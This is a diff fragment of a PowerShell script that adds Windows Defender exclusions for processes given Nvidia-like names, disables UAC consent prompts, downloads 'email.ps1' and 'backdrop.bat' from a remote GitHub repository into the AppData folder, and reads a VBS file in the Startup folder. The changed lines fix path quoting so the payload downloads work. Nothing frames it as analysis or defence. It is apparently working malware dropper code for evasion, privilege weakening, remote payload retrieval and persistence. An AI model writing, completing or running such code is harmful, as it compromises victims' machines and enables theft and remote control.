@@ -14,9 +14,9 @@ Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
 Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile '$env:appdata\Microsoft\email.ps1'
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $env:appdata\Microsoft\email.ps1
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile '$env:appdata\Microsoft\backdrop.bat'
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $env:appdata\Microsoft\backdrop.bat
 
 
 (Get-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs") |
